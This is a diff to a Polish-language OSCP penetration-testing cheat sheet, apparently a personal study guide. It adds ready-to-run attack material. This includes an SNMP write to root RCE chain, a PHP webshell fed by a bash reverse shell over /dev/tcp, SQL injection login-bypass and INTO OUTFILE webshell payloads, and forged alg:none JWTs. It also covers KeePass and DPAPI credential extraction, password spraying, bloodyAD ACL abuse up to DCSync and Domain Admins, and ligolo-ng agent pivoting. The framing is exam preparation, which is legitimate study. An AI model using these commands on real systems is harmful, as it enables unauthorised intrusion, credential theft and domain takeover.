@@ -26,7 +26,6 @@
 | [12](#12-toolbox--reference) | **Toolbox** | grep, awk, find, xxd, git i inne narzędzia bazowe |
 | [13](#13-cloud--aws-enumeracja-i-atak) | **Cloud (AWS)** | S3, IAM, EC2, Lambda — enumeracja i eskalacja w chmurze |
 | [14](#14-reporting--technical-report) | **Reporting** | Notatki, struktura raportu, PoC, remediation, walkthrough |
-| [15](#15-wszystko-i-nic-worklog--stuck-buster) | **Wszystko i nic** | Worklog utkniętych maszyn: co zrobione + co spróbować dalej |
 | [A](#appendix-a--skroty-klawiszowe-shell) | **Appendix A** | Skróty klawiszowe shella |
 | [B](#appendix-b--oscp-exam-playbook--metodyka) | **Appendix B** | OSCP exam playbook — metodyka, checklisty, pułapki |
 
@@ -105,6 +104,14 @@ UDP (wolne — celuj w konkretne porty; SNMP/DNS/TFTP/IKE):
 sudo nmap -sU --top-ports 20 -oN nmap_udp.txt $IP
 ```
 
+⚡ **UDPX — szybki UDP service scan** (uzupełnia wolny `nmap -sU`): jeden pakiet na usługę, wykrywa po sygnaturach DNS/SNMP/NTP/IKE/mDNS/NetBIOS/OpenVPN itd.
+```bash
+udpx -t $IP                       # pojedynczy host
+udpx -t 192.168.50.0/24 -c 200    # cała podsieć, 200 równoległych
+udpx -t $IP -o udpx.json          # wynik do JSON  (lista celów: -l targets.txt — sprawdź `udpx -h`)
+```
+> `nmap -sU` jest wolny i sypie `open|filtered` (ślepe). UDPX realnie probuje znane usługi → szybciej potwierdza CO odpowiada. Potwierdzony port dobij: `sudo nmap -sU -sV -p<port> $IP`. Klasyk OSCP: TCP nic nie dało → UDPX/`-sU` znajduje `161/snmp` → §1.6.
+
 **Wybór typu skanu:** `-sS` (SYN/half-open, domyślny gdy root — szybki, cichy) · `-sT` (connect, bez roota/przez proxy — wolniejszy, wpada w logi apki) · `-Pn` (host blokuje ICMP → traktuj jako up) · `-O --osscan-guess` (fingerprint OS ze stacku TCP/IP).
 
 **Sweep całej podsieci (greppable `-oG` → potok):**
@@ -161,6 +168,23 @@ ffuf -u "http://$IP/page?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/bu
 
 > 💡 **Zawsze** sprawdź źródło strony, `/robots.txt`, `/sitemap.xml`, nagłówki (`curl -I`), technologie (`whatweb $IP`), oraz komentarze w HTML. `nikto -h http://$IP` na szybki przegląd.
 
+### Exposed source — `.git` / `.svn` / backupy (jackpot z sekretami)
+> Wystawiony katalog kontroli wersji lub backup źródeł = pełny kod + **historia z hardcodowanymi hasłami/kluczami**. Sekrety usunięte w bieżącej wersji **wciąż siedzą w starych commitach**.
+```bash
+# wykrycie:
+curl -s http://$IP/.git/HEAD            # "ref: refs/heads/..." = .git wystawiony
+curl -s http://$IP/.git/config          # bywa remote z creds
+# dump calego repo z obiektow HTTP:
+git-dumper http://$IP/.git/ out && cd out
+# przekop HISTORIE pod sekrety (nie tylko HEAD!):
+git log -p | grep -iE 'pass|secret|token|api[_-]?key|BEGIN.*PRIVATE KEY'
+git log --all --oneline ; git show <commit>
+# repo pod nazwana sciezka (np. z README) — HTTP gdy 443 zamkniete:
+git clone http://$IP/path/repo.git       # albo: git-dumper http://$IP/path/repo.git/ out
+echo "$IP nazwa.host" | sudo tee -a /etc/hosts   # gdy repo woła po hostname/vhost
+```
+> Szukaj też `.svn/` (`svn-extractor`), `.hg/`, backupów źródeł (`.zip/.tar.gz/.bak` z gobustera). Sekrety najczęściej w `config.php`/`.env`/`settings.py` w **historii**, nie w HEAD.
+
 ## 1.4 DNS
 
 ```bash
@@ -194,6 +218,34 @@ Test-NetConnection -Port 445 192.168.50.151            # TcpTestSucceeded:True =
 ```cmd
 net view \\dc01 /all                                   :: share'y (ADMIN$/C$/IPC$) + komentarze
 ```
+
+## 1.4d FTP (port 21) — enum + pobieranie CAŁYCH katalogów
+
+> Anonymous login, wersja → searchsploit, **`ls -la` (ukryte pliki!)**, test zapisu. Uwaga: `get` pobiera tylko pojedyncze pliki — do katalogów potrzebny `wget -r` / `lftp mirror`.
+
+### Enumeracja
+```bash
+nmap -p21 -sV --script=ftp-anon,ftp-syst $IP           # anon? wersja? system (Win/Unix)?
+ftp $IP                                                 # login: anonymous / ftp   (haslo: dowolny e-mail)
+#   ls -la     <-- POKAZUJE dotfiles (.ssh/.bash_history/.git) — bez tego je przeoczysz!
+#   binary     <-- przed pobraniem plikow binarnych (hive/zip/exe); tryb ascii je USZKODZI
+#   put /etc/hostname   <-- test zapisu: przechodzi = writable (webshell/authorized_keys, §1.9)
+#   passive wisi? -> epsv4 off / active mode (§1.9 "FTP passive hang")
+```
+
+### Pobieranie całych katalogów (rekurencyjnie)
+```bash
+# wget — rekurencyjnie caly katalog/serwer:
+wget -r -np --no-passive-ftp ftp://anonymous:anonymous@$IP/          # -r rekurencja, -np bez wchodzenia wyzej
+wget -m  --no-passive-ftp ftp://anonymous:anonymous@$IP/sciezka/     # -m = mirror (pelne odbicie)
+# lftp — pewniejszy z dotfiles i strukturą katalogów:
+lftp -u anonymous, $IP -e 'set ftp:passive-mode false; mirror -v / ./ftp_loot; quit'
+#   interaktywnie w lftp:  mirror <zdalny_kat> <lokalny>   (ciagnie rekurencyjnie, z .git/.ssh)
+# przekop po pobraniu:
+grep -riE 'pass|BEGIN.*PRIVATE KEY|ssh-rsa|token|api[_-]?key' ./ftp_loot/
+find ./ftp_loot -name id_rsa -o -name '.bash_history' -o -name '*.kdbx' -o -name config.php
+```
+> ⚠️ **`get <katalog>` NIE działa** — FTP `get` bierze wyłącznie pliki. Katalog (np. `.git/`, home usera) ciągniesz przez `wget -r`/`-m` albo `lftp mirror`. Uwaga: `.git` to **katalog** (objects/refs/HEAD), nie plik — jak widzisz „`.git`" jako pojedynczy plik, to nie repozytorium.
 
 ## 1.5 SMB / NetBIOS (porty 139, 445)
 
@@ -357,6 +409,71 @@ wpscan --url http://$IP --enumerate ap --plugins-detection aggressive --api-toke
 
 ---
 
+## 1.9 Usługi — dodatkowe scenariusze dostępu
+
+### SNMP write → RCE jako root (community RW)
+> SNMP z domyślnym community wycieka userów/procesy/hasła w cmdline (enum → §1.x wyżej: `snmpwalk`/`snmp-check`). Przy community **RW** daje RCE jako root (`snmpd` biegnie jako root).
+```bash
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip  # znajdz community
+snmpset -v2c -c private $ip iso.3.6.1.2.1.1.6.0 s TEST     # przechodzi = MASZ zapis (RW)
+# jesli zapis dziala -> zarejestruj wlasny NET-SNMP extend i wykonaj jako root:
+snmpset -v2c -c private $ip 'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 5 \
+  'NET-SNMP-EXTEND-MIB::nsExtendCommand."x"' s /bin/bash \
+  'NET-SNMP-EXTEND-MIB::nsExtendArgs."x"' s "-c 'bash -i >& /dev/tcp/$lhost/4444 0>&1'" \
+  'NET-SNMP-EXTEND-MIB::nsExtendStatus."x"' i 1
+# nc -lvnp 4444 PRZED; odczyt outputu = uruchomienie komendy (run-on-read):
+snmpwalk -v2c -c private $ip 'NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."x"'
+```
+> 💎 Z pola `description` userów i `NET-SNMP-EXTEND-MIB` często wyciekają **nazwy kont** i wskazówki o hasłach (np. skrypt „reset password to default"). Spisuj je jako listę loginów (SSH/spray).
+
+### klucze SSH z anonymous FTP / czytelnego share (id_rsa)
+> Anonymous FTP albo otwarty share oddaje `id_rsa`/`id_rsa.pub`. Klucz publiczny (komentarz) mówi, do kogo pasuje.
+```bash
+wget -m --no-passive "ftp://anonymous:anonymous@$ip/"   # zrzuc cala zawartosc
+chmod 600 id_rsa*                         # za otwarte perms => ssh IGNORUJE klucz i pyta o haslo
+cat id_rsa.pub                            # komentarz = user@host -> POZNAJ wlasciciela
+ssh -v -o IdentitiesOnly=yes -i id_rsa $user@$ip   # w -v szukaj: "Server accepts key"
+# klucz zaszyfrowany ("Enter passphrase for key") => lam offline:
+ssh2john id_rsa > id_rsa.hash ; john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+> ⚠️ **Rozróżniaj prompty:** „*<user>'s password:*" = klucz odrzucony (złe perms / zły user). „*Enter passphrase for key*" = klucz OK, tylko zaszyfrowany. Pierwszy prompt → napraw perms i user, ZANIM uznasz klucz za bezużyteczny.
+
+### FTP `ls` wisi po „Entering Extended Passive Mode"
+> Login przechodzi, ale `ls`/`get` zawiesza się po `229 Entering Extended Passive Mode`. To nie problem loginu — **kanał danych** (EPSV → wysoki port serwera, firewall/NAT go tnie).
+```bash
+# w kliencie tnftp:
+ftp> epsv4 off        # wylacz Extended Passive dla IPv4 -> sprobuj ls
+ftp> passive          # albo przelacz na ACTIVE (serwer laczy sie do Ciebie; przez VPN dziala)
+ftp -A $ip                                        # -A = active od startu
+lftp -u user, $ip -e 'set ftp:passive-mode off; ls; quit'
+```
+> 💡 Passive = serwer otwiera port danych. Active = klient otwiera, serwer łączy do klienta. Gdy jedno wisi — spróbuj drugiego. Na OSCP przez VPN **active** często przechodzi, gdy passive tnie firewall.
+
+### zapisywalny anonymous FTP → webshell (check webroot + PHP)
+> Anon FTP przyjmuje `put`. ⚠️ Ale `put` ≠ RCE — potwierdź, że plik **ląduje w webroocie** i że serwer **wykonuje** dany typ (nginx domyślnie NIE odpala PHP!).
+```bash
+ftp $ip            # binary!  potem: put test.html
+curl http://$ip/test.html                 # widac -> FTP dir = webroot; 404 -> szukaj /uploads//files//data/
+#    wgraj info.php z:  <?php echo 7*7; ?>
+curl http://$ip/info.php                   # "49" = wykonuje; surowy <?php = NIE (nginx bez php-fpm)
+#    shell.php:  <?php system($_GET['c']); ?>   (listener nc -lvnp 443 PRZED):
+curl -G "http://$ip/shell.php" --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/$lhost/443 0>&1'"
+```
+> **Nie wykonuje PHP?** → wgraj typ, który serwer faktycznie odpala; albo jeśli FTP pisze do czyjegoś `home` → podłóż `~/.ssh/authorized_keys` (niżej). Nie zakładaj, że `put` = shell.
+
+### zapisywalny katalog usera (FTP/share) → authorized_keys → SSH
+> Anon FTP / share pozwala pisać do katalogu będącego realnym `$HOME` usera (często world-writable). SSH otwarte → wrzucasz klucz i logujesz się.
+```bash
+ssh-keygen -t ed25519 -f k -N ''
+ftp -A $ip                       # lub smbclient //$ip/share
+cd <sciezka_do_home_usera> ; mkdir .ssh ; cd .ssh
+put k.pub authorized_keys
+ssh -i k <user>@$ip
+```
+> ⚠️ Działa **tylko** gdy katalog to faktyczny `$HOME` (sshd czyta `~/.ssh/authorized_keys`). `put` przechodzi, a SSH **dalej pyta o hasło** = to był backup, nie home → inny wektor. Perms `.ssh`/klucza muszą być ciasne (600).
+
+---
+
 # 2. Initial Access / Exploitation (Uzyskanie dostępu)
 
 > Cel fazy: pierwszy shell / pierwsze poświadczenia. Web, słabe hasła, znane CVE.
@@ -388,6 +505,17 @@ offsec' OR 1=1 -- //
 ' or 1=1 in (SELECT password FROM users) -- //
 ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
 ```
+> ⚠️ **Pułapka komentarza:** w MySQL/MariaDB `--` MUSI mieć spację (lub znak) po sobie → używaj `-- -` albo `#`. Samo `'or true--` nie zadziała (brak spacji + brak wyjścia ze stringa apostrofą).
+
+**Auth bypass — logowanie (pole username/email; hasło dowolne):**
+```sql
+admin'-- -                     -- zamknij string + zakomentuj sprawdzanie hasla → logujesz sie jako 'admin'
+<znany_login>'-- -             -- to samo, gdy znasz istniejacy login/email
+' OR 1=1-- -                   -- pierwszy wiersz tabeli userow
+' OR 1=1#                      -- wariant z # (gdy -- filtrowane)
+admin' OR '1'='1'-- -
+```
+> Komentowanie hasła (`login'-- -`) jest czystsze niż `OR 1=1` — logujesz się jako **konkretny** user, nie „pierwszy z brzegu". Formularz ma `csrf_token`? Pobierz świeży do każdego requestu (Burp Repeater) — albo najpierw sprawdź, czy w ogóle jest walidowany (często nie).
 
 ### UNION-based (wyciąganie danych)
 ```sql
@@ -402,6 +530,8 @@ offsec' OR 1=1 -- //
 -- 5. WebShell na dysk (INTO OUTFILE)
 ' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 -- następnie: http://TARGET_IP/tmp/webshell.php?cmd=id
+-- Windows (Apache/XAMPP): OUTFILE "C:/xampp/htdocs/sh.php"  lub  "C:/Apache24/htdocs/sh.php"
+--   ścieżkę webroota potwierdź z błędu aplikacji / LFI; wymaga uprawnienia FILE + luźnego secure_file_priv
 ```
 
 ### Blind (time-based)
@@ -1084,7 +1214,23 @@ jwt_tool <JWT> -S hs256 -p '<zlamany_sekret>' -T     # -T = edytuj roszczenia in
 # 4. RS256->HS256 confusion: podpisz HS256 uzywajac PUBLICZNEGO klucza serwera jako sekretu:
 jwt_tool <JWT> -X k -pk public.pem
 ```
-> Kolejność: rozkoduj → spróbuj `alg=none` → złam sekret (`-m 16500`) → podmień roszczenia. Publiczny klucz często leży pod `/jwks.json`, w cert TLS, albo w repo.
+**JWT jako WYCIEK danych** — payload to zwykłe base64, developerzy wpychają tam sekrety (hasła, role, id). ZAWSZE rozkoduj payload, zanim zaczniesz forge:
+```bash
+cut -d. -f2 <<<'<JWT>' | base64 -d 2>/dev/null; echo    # 2. segment = payload (base64url, ignoruj padding)
+#  szukaj pol: pass/password, isAdmin, role, userId -> gotowe creds albo cel do podmiany
+```
+**Ręczny forge alg:none** (gdy `jwt_tool` krztusi się niestandardowym tokenem — wiele segmentów itp.):
+```bash
+python3 - <<'EOF'
+import base64,json
+b=lambda d: base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
+h=b({"typ":"JWT","alg":"none"})
+p=b({"userId":"admin","isAdmin":"true"})     # dopasuj pola do oryginalu; probuj "true" (str) i true (bool)
+print(f"{h}.{p}.")                            # PUSTY podpis po ostatniej kropce
+EOF
+# uzyj: curl -H "Authorization: Bearer <token>" http://$ip/api/... (endpoint zwracajacy "Not authorized")
+```
+> Kolejność: **rozkoduj payload (wyciek!)** → `alg=none` (forge admina) → jak serwer wymusza podpis: sekret **znaleziony** (config/`/dev`/repo) lub złamany (`-m 16500`) → `-S hs256 -p '<sekret>'` → podmień `isAdmin/role`. Publiczny klucz (RS256→HS256) bywa pod `/jwks.json`, w cert TLS, w repo.
 
 ## 2.16 AV/EDR evasion — koncepcja (BEZ gotowców)
 
@@ -1146,6 +1292,20 @@ jwt_tool <JWT> -X k -pk public.pem
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
 ```
 > SSRF przez XXE: `SYSTEM "http://169.254.169.254/..."` (chmura/IMDS) lub wewnętrzny host. RCE tylko gdy jest rozszerzenie `expect` (`expect://id`). Nasłuch OOB: `python3 -m http.server 8000`.
+
+---
+
+## 2.16 Password reset — wyciek/przewidywalność tokenu → account takeover
+
+> Apka ma flow „reset hasła", a token trafia gdzieś, skąd da się go odczytać (czytelny katalog, odpowiedź serwera, przewidywalny wzór) — albo token nie wygasa / nie jest wiązany z użytkownikiem. Wyciek/odgadnięcie tokenu = ustawiasz nowe hasło ofiary **bez znajomości starego**.
+
+**Metodyka (dwa endpointy: żądanie resetu + konsumpcja tokenu):**
+1. **Zmapuj flow** — znajdź stronę inicjującą reset i stronę konsumującą token (`...?token=`): `gobuster ... | grep -iE 'reset|forgot|change|token'` + podejrzyj źródło formularza (zdradza URL i pola).
+2. **Zainicjuj reset** dla znanego konta (POST z jego identyfikatorem; dołącz świeży `csrf_token`, jeśli wymagany).
+3. **Zdobądź token** z kanału wycieku: czytelny katalog (`/logs//tmp//backup/`), odpowiedź API, albo przewidywalny wzór (czas/sekwencja/słaby hash).
+4. **Skonsumuj token** z nowym hasłem → zaloguj się jako ofiara.
+
+> Poluj na: czytelne katalogi z artefaktami, tokeny oparte o czas/sekwencję/MD5, brak wygasania i brak powiązania token↔user. To account takeover bez łamania hasła.
 
 ---
 
@@ -1641,6 +1801,29 @@ john --wordlist=rockyou.txt ssh.hash && john --show ssh.hash    # John ogarnia a
 ```
 > Dodatkowe tryby `-m`: **13400** KeePass · **22921** klucz SSH · **11600** 7-Zip · **13600** ZIP · **9600** Office 2013+ · **7500** Kerberos AS-REQ (etype 23).
 
+### KeePass (`.kdbx`) — od pliku do wpisów
+> Baza KeePass na pulpicie admina/serwera to klasyczny most do NASTĘPNEJ maszyny (creds domenowego Administratora / innego hosta). Flow: zdejmij hash → złam master → otwórz → wyciągnij wpisy.
+> ⚠️ **KDBX4 / Argon2:** stary `keepass2john` rzuca `File version '40000' is currently not supported!` → użyj nowszego z snap: `sudo snap install john-the-ripper` → `snap run john-the-ripper.keepass2john DB.kdbx > kp.hash` (a łam Johnem: `--format=KeePass`). KDBX4 używa **Argon2** (celowo wolny KDF) — `hashcat -m 13400` działa, ale każdy kandydat kosztuje, więc **re-use znanych haseł NAJPIERW**.
+```bash
+# 1) hash mastera (ZDEJMIJ prefiks 'nazwa:' — inaczej hashcat ładuje śmieci):
+keepass2john Database.kdbx | sed 's/^[^:]*://' > kp.hash
+
+# 2) NAJPIERW re-use: sprawdź hasła, które JUŻ znasz z tej maszyny (bardzo częste!):
+printf '%s\n' 'ZnalezioneHaslo1' 'ZnalezioneHaslo2' 'ZnalezioneHaslo3' > found_creds.txt
+hashcat -m 13400 kp.hash found_creds.txt
+
+# 3) potem rockyou, dopiero na końcu rockyou + reguły (ludzkie hasło mastera zwykle prostsze niż serwisowe):
+hashcat -m 13400 kp.hash /usr/share/wordlists/rockyou.txt
+hashcat -m 13400 kp.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
+
+# 4) otwórz bazę i ZRZUĆ wszystkie wpisy (login + hasło + notatki):
+keepassxc-cli ls  Database.kdbx                         # lista wpisów
+keepassxc-cli show -s Database.kdbx 'Nazwa Wpisu'       # -s = pokaż hasło jawnie
+keepassxc-cli export -f csv Database.kdbx               # albo eksport całości naraz
+#   alternatywy: kpcli --kdb Database.kdbx  |  GUI: keepassxc
+```
+> ⚠️ **Keyfile:** jeśli master nie łamie się mimo oczywistego hasła, baza może wymagać **pliku-klucza** (`.key`/`.keyx`) obok hasła — poszukaj go w tym samym katalogu / profilu usera i podaj `--key-file`. Wpisy w bazie to nie tylko hasła — czytaj **URL i pole Notes** (bywa tam host docelowy, użytkownik, ścieżka).
+
 **Reguły hashcat pod znaną politykę** (z `note.txt` znasz wzorzec → zbuduj regułę ręcznie — często jedyna droga):
 ```bash
 echo '$1' > demo.rule                              # składnia: $X dopisz na końcu · ^X na początku · c Kapitalizuj · l/u lower/upper · r odwróć
@@ -1933,6 +2116,47 @@ iwr -UseDefaultCredentials http://web04
 
 ---
 
+## 5.6 Cracks — plaintext hasło (env/config/transcript) → reuse → privesc
+
+> Enum wyciąga hasło w jawnym tekście — zmienne środowiskowe (`*_PASSWORD=...`), configi (`.env`, `web.config`, connection string), transkrypty PowerShell (`C:\*\output.txt`), historia. Hasło zwykle **działa na INNE konto** (lokalny admin / serwis / user domenowy) → privesc przez reuse.
+```bash
+# 1. kandydaci na HASLA:  winpeas "env variables"/"PowerShell transcript";  Get-ChildItem env: ; type C:\*\output.txt
+# 2. kandydaci na LOGINY:  dir C:\Users ; net user ; net localgroup Administrators ; net user /domain
+# 3. spray hasla po WSZYSTKICH loginach:
+nxc smb   $ip -u users.txt -p '<found-pass>' --continue-on-success   # (Pwn3d!) = admin
+nxc winrm $ip -u users.txt -p '<found-pass>'
+# 4. trafienie -> shell:
+evil-winrm -i $ip -u <user> -p '<found-pass>'
+```
+> ⚠️ Ignoruj przykłady/placeholdery cytowane w outputcie narzędzi (winpeas/PowerView wrzucają fragmenty swojej dokumentacji) — to NIE realne creds. Zasada: hasło z jednego kontekstu **próbuj na admin/serwis** — reuse to najczęstszy privesc.
+
+## 5.7 DPAPI — odczyt zapisanego credentiala (Windows Credential Manager)
+
+> winpeas flaguje `DPAPI ... Master Keys` + blob w `...\Credentials\`. To zapisany login+hasło (`runas /savecred`, RDP, task) — odszyfrowywalny gdy **znasz hasło usera** (lub jesteś nim w sesji). Zwykle kryje creds **admina/serwisu**.
+```
+# lokalizacje (winpeas je podaje):
+#   Cred blob:  C:\Users\<u>\AppData\Local\Microsoft\Credentials\<HEX>
+#   Masterkey:  C:\Users\<u>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>
+```
+**Metoda PEWNA — impacket OFFLINE z Kali** (mimikatz on-host w zdalnej sesji często pada):
+```bash
+# 1. sciagnij OBA pliki (w evil-winrm: 'download <pelna_sciezka>'):
+#    masterkey:  ...\Roaming\Microsoft\Protect\<SID>\<GUID>   |   cred blob: ...\Local\Microsoft\Credentials\<HEX>
+# 2. odszyfruj masterkey haslem usera (SID z nazwy folderu Protect):
+impacket-dpapi masterkey -file <GUID> -sid <SID> -password '<user-pass>'
+#    -> "Decrypted key: 0x...."   <-- TO jest masterkey (krotki hex), NIE 'pbKey' z mimikatza!
+# 3. odszyfruj credential tym kluczem:
+impacket-dpapi credential -file <HEX> -key 0x<decrypted-key>
+#    -> Username / Target / Unknown: <HASLO>
+```
+> ⚠️ **Pułapki:**
+> - Mimikatz `dpapi::masterkey /password:` w **evil-winrm/WinRM** rzuca `kull_m_crypto_hkey_session (0x00000005)` — bug providera w zdalnej sesji, NIE złe hasło. → rób **impacket offline**.
+> - `pbKey` z outputu mimikatza to **ZASZYFROWANY** masterkey (170+ bajtów) — NIE wklejaj jako `/masterkey`. Prawdziwy masterkey to krótki hex z impacketowego „Decrypted key".
+> - Masterkey SHA512/AES256 = Win10+; tam mimikatz `/password:` pada najczęściej.
+> Nie znasz hasła, ale jesteś userem w sesji: `dpapi::masterkey /rpc` (pyta DC) lub `sekurlsa::dpapi` (wymaga admina). Odzyskany cred → `evil-winrm`/`psexec` → proof.
+
+---
+
 # 6. Active Directory
 
 > 🔗 Setup BloodHound graph: https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
@@ -2207,6 +2431,33 @@ net group "Management Department" stephanie /del /domain     :: POSPRZĄTAJ po s
 ```powershell
 Get-NetGroup "Management Department" | select member         # weryfikacja (przed i po)
 ```
+
+### ACL abuse z Kali (bloodyAD) — gdy działasz zdalnie / przez pivot
+> PowerView wymaga sesji na hoście domenowym. Z Kali (np. przez ligolo §8.3) ten sam łańcuch robi **bloodyAD** — czysto po LDAP, hasłem/hashem/kerberosem.
+```bash
+pipx install bloodyAD
+# ustaw raz (bez spacji w placeholderach):  H="--host $DC -d $DOMAIN -u <ja> -p <haslo>"   (albo -k / -H <hash>)
+bloodyAD $H get writable                       # co MOGE zapisac (szybki recon praw — bez PowerView)
+bloodyAD $H add genericAll <ofiara> <ja>       # WriteDacl -> pelna kontrola nad ofiara
+bloodyAD $H set password <ofiara> 'Passw0rd!2024'                    # GenericAll/ForceChange -> reset
+bloodyAD $H set object <ofiara> serviceprincipalname -v 'fake/svc'   # GenericWrite -> targeted kerberoast (sprzataj!)
+bloodyAD $H add shadowCredentials <ofiara>     # GenericWrite/All + ADCS w domenie -> PKINIT -> hash NT
+```
+
+### Łańcuch grupowy: WriteDacl nad GRUPĄ → dopisz się → odziedzicz jej prawa
+> Bardzo częsty wzorzec: masz **WriteDacl nad grupą** (np. „HelpDesk"), a grupa ma szerokie prawa. Nie resetujesz konta — dopisujesz się do grupy i dziedziczysz jej uprawnienia.
+```bash
+bloodyAD $H add genericAll '<Grupa>' <ja>      # 1) WriteDacl -> nadaj sobie prawo dopisywania czlonkow
+bloodyAD $H add groupMember '<Grupa>' <ja>     # 2) dopisz sie (uprawnienia aktywne przy nowym bindzie)
+# 3) uzyj REALNYCH praw grupy — zaleznie co grupa moze:
+bloodyAD $H add dcsync <ja>                     #    GenericAll na obiekcie domeny -> DCSync...
+impacket-secretsdump "$DOMAIN/<ja>:<haslo>@$DC" -just-dc
+bloodyAD $H add groupMember 'Domain Admins' <ja>   #    ...albo GenericAll na DA -> wprost do Domain Admins
+```
+> ⚠️ **Lekcje z praktyki (na tym się przewracają):**
+> - **`add dcsync` → `insufficientAccessRights` na `DC=...`** = grupa **nie ma** praw nad obiektem domeny (mimo GenericAll nad wieloma innymi obiektami). Nie forsuj DCSync — użyj tego, co grupa REALNIE może: dopisz się do `Domain Admins`, zresetuj konkretnego DA, albo wejdź na serwer, gdzie grupa jest lokalnym adminem.
+> - **Grupa typu „HelpDesk" bywa lokalnym adminem na serwerach członkowskich** (nie tykając domeny). Po dopisaniu się `evil-winrm`/RDP na taki serwer działa **jako admin** — to już proof, nawet bez DA. (Sygnał: czytasz `C:\Users\Administrator\` jako zwykły user → masz tam admina; potwierdź `whoami /groups`.)
+> - **winPEAS „Found N objects where your principal has abuse-friendly rights"** potrafi ZMYLIĆ (miesza prawa grup/dziedziczenie, atrybuuje pod bieżącego usera). Weryfikuj **autorytatywnie**: `Find-InterestingDomainAcl -ResolveGUIDs` (PowerView) albo `bloodyAD get writable`.
 
 ## 6.6 Domain shares & SYSVOL (GPP cpassword)
 
@@ -2699,20 +2950,41 @@ netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow pr
 ```
 ### ligolo-ng (najwygodniejsze — tun interface, ZERO proxychains)
 > Robi wirtualny interfejs `tun` na Kali → skanujesz i łączysz się do głębszej sieci **natywnie** (nmap z SYN, evil-winrm, RDP — jak do lokalnej podsieci). Najlepsze na OSCP AD-pivot.
+
+**Model: proxy + agent (dwie połówki jednego narzędzia).** Problem pivotu: Kali widzi zewn. IP pivota, ale nie widzi sieci wewnętrznej ZA nim; pivot widzi obie. Robimy z pivota przekaźnik:
+> - **`proxy`** — uruchamiasz na KALI (centrala; tworzy interfejs `tun`).
+> - **`agent`/`agent.exe`** — mały binarny plik, który uruchamiasz NA PIVOCIE; łączy się z powrotem do proxy i przekazuje ruch. To po prostu druga połówka ligolo dla danego OS-a — nie exploit ani malware.
+
+Pobierz oba z oficjalnych release'ów: **https://github.com/nicocha30/ligolo-ng/releases** → `Assets` (podmień wersję na aktualną):
 ```bash
-# 1. Na KALI (proxy) — raz przygotuj interfejs:
+# na KALI: proxy dla Linuksa + agent dla OS-u pivota (tu Windows x64):
+wget https://github.com/nicocha30/ligolo-ng/releases/download/vX.Y.Z/ligolo-ng_proxy_X.Y.Z_linux_amd64.tar.gz
+wget https://github.com/nicocha30/ligolo-ng/releases/download/vX.Y.Z/ligolo-ng_agent_X.Y.Z_windows_amd64.zip
+tar -xf ligolo-ng_proxy_*_linux_amd64.tar.gz   # -> plik `proxy`
+unzip  ligolo-ng_agent_*_windows_amd64.zip     # -> `agent.exe` (dla Linux-pivota: agent)
+chmod +x proxy
+```
+Setup krok po kroku:
+```bash
+# 1. KALI — przygotuj interfejs tun (raz po kazdym restarcie Kali):
 sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
-./proxy -selfcert                                    # konsola ligolo (listener :11601)
-# 2. Na PIVOCIE (agent) — laczy sie do Ciebie (upload agent.exe/agent):
-./agent -connect $lhost:11601 -ignore-cert
-# 3. W konsoli ligolo:
-session                                              # wybierz agenta
-# 4. Na KALI dodaj trase do podsieci ZA pivotem:
-sudo ip route add 172.16.5.0/24 dev ligolo
-# 5. W ligolo:  start   -> teraz 172.16.5.x osiagalne WPROST:
-nmap -sV 172.16.5.10 ; evil-winrm -i 172.16.5.10 -u u -p p
+# 2. KALI — odpal centrale (zostaw okno otwarte; pojawi sie konsola `ligolo-ng »`):
+sudo ./proxy -selfcert -laddr 0.0.0.0:11601      # -selfcert = sam generuje cert TLS
+# 3. Dostarcz agenta na PIVOT (np. serwer HTTP na Kali -> pobranie na celu):
+#    KALI:  python3 -m http.server 8080
+#    PIVOT (PowerShell): iwr -uri http://$LHOST:8080/agent.exe -Outfile agent.exe
+# 4. PIVOT — uruchom agenta (laczy sie z powrotem do proxy na Kali):
+.\agent.exe -connect $LHOST:11601 -ignore-cert   # $LHOST = Twoje VPN IP; -ignore-cert bo self-signed
+# 5. W konsoli ligolo na Kali — wybierz sesje i wystartuj tunel:
+session                                          # wybierz numer agenta (np. 1)
+start
+# 6. KALI (zwykly terminal) — dodaj trase do podsieci ZA pivotem:
+sudo ip route add INNER_SUBNET/24 dev ligolo     # np. 172.16.5.0/24
+# 7. Test — cele wewn. osiagalne WPROST (bez proxychains):
+nxc smb INNER_HOST ; nmap -sV INNER_HOST ; evil-winrm -i INNER_HOST -u u -p p
 ```
 > **Reverse shell z głębi sieci do Ciebie:** w konsoli ligolo `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444` — cel łączy się na `pivot:4444`, a Ty łapiesz na lokalnym `nc -lvnp 4444`.
+> **Typowe wpadki:** agent się nie łączy → sprawdź `$LHOST` (VPN IP, nie lokalny) i czy pivot ma trasę powrotną do Kali; `ip route` marudzi → interfejs `ligolo` musi być `up` (krok 1); wszystko działa, ale brak pakietów → w ligolo nie zrobiłeś `start`.
 
 ## 8.4 Tunneling przez DPI (gdy filtrują ruch)
 
@@ -3407,89 +3679,6 @@ cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
 > - **Testing Environment Considerations** — okoliczności łagodzące (późne creds, za mało czasu vs za duży scope).
 > - **Technical Summary** — grupuj findingi po obszarach (Auth / Access Control / Patch Mgmt / Misconfig) + risk heat map; XSS+SQLi+upload razem = systemowy problem (niesanityzowany input → szkolenie devów).
 > - **Remediation** — konkretna, NIE warstwowa (każdy krok = osobne rozwiązanie), różna per klient (szpital: izolacja/patch-later; bank: brak patcha = critical). Unikaj fixów, których nikt nie wdroży.
-
----
-
-# 15. Wszystko i nic (worklog / stuck-buster)
-
